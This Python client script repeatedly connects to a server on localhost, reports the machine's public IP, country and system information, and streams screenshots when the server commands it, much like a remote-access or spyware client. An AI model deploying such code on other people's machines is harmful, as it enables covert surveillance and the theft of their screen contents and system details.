import sys
import logging
import time
import platform
import subprocess
import requests
import json
import pyautogui
import numpy as np
import cv2
import chardet
from connection_module import SecureConnectionClient

logging.basicConfig(level=logging.DEBUG,
                    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                    handlers=[
                        logging.FileHandler("client_module.log"),
                        logging.StreamHandler(sys.stdout)
                    ])

start_port, end_port = 50000, 50100

SERVER_IP = '127.0.0.1'


def get_ip_and_country():
    response = requests.get("https://api.ipify.org?format=json")
    ip = response.json()['ip']
    response = requests.get(f"https://ipinfo.io/{ip}/json")
    data = response.json()
    country = data.get('country', 'Unknown')
    return ip, country

def main():
    while True:
        try:
            for port in range(start_port, end_port):
                logging.info(f"Starting client to connect to {SERVER_IP}:{port}")
                try:
                    client = SecureConnectionClient(server_ip=SERVER_IP, server_port=port)
                    break
                except Exception as e:
                    logging.error(f"Failed to connect to {SERVER_IP}:{port}")
            ip, country = get_ip_and_country()
            operation_system = platform.system()
            cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
            encoding = 'cp866' if operation_system == "Windows" else 'utf-8'
            process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, encoding=encoding)
            stdout, stderr = process.communicate()
            systeminfo = stdout + stderr
            data = {"ip": ip, "country": country, "os": operation_system, "systeminfo": systeminfo}
            json_data = json.dumps(data)
            json_bytes = json_data.encode("utf-8")
            client.send_data_AES(json_bytes)
            
            while True:
                command = client.receive_data_AES()
                if command == b"1":
                    operation_system = platform.system()
                    cmd = "systeminfo" if operation_system == "Windows" else "lscpu"
                    process = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                    stdout, stderr = process.communicate()
                    client.send_data_AES((stdout + stderr).encode("utf-8"))
                elif command == b"C":
                    print("Capturing...")
                    capturing = True
                    while capturing:
                        screenshot = pyautogui.screenshot()
                        screenshot_np = np.array(screenshot)
                        screenshot_np = cv2.resize(screenshot_np, (1280, 720))
                        screenshot_np = cv2.cvtColor(screenshot_np, cv2.COLOR_BGR2GRAY)

                        img_data = screenshot_np.tobytes()

                        try:
                            client.send_data_AES(img_data)
                        except Exception as e:
                            print(f"Error sending image {e}")
                            raise e

                        signal = client.receive_data_AES()
                        if signal == b"STOP":
                            capturing = False
                elif command == 'exit':
                    break

            client.close()
            logging.info("Client connection closed")
        except Exception as e:
            logging.error(f"An error occurred: {e}")
        time.sleep(15)

if __name__ == "__main__":
    main()
